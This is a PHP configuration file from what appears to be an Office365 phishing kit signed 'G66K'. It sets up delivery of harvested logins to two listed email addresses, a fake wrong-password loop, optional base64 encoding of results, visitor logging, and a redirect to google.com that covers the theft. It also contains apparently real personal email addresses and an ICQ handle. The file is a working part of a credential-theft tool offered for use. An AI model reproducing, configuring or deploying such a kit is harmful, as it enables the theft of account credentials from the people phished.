<?php
error_reporting(0);
class Config {

    static public $config = [
        'Author' => 'G66K',
        'ICQ' => '@747246257',
        'withParams' => true, // with ?email= or not
        'base64' => true, //encode base64 or not
        'saveLogs' => true, // save logs to file or not
        'visitor' => true, //save vistors or not
        'loop' => 2, // how many wrong password loop should be
        'subject' => 'From me to You', // your result subject
        'email' => 'loantran422@gmail.com, dasta2@yandex.com', // your email result
        'fromname' => 'G66K Office365 Logs', //sender name
        'fromemail' => 'g66k@logs.com', //sender email
        'successLink' => 'https://www.google.com', // where should i redirect in the end

    ];

    static public function Get($key)
    {
        return self::$config[$key];
    }

}


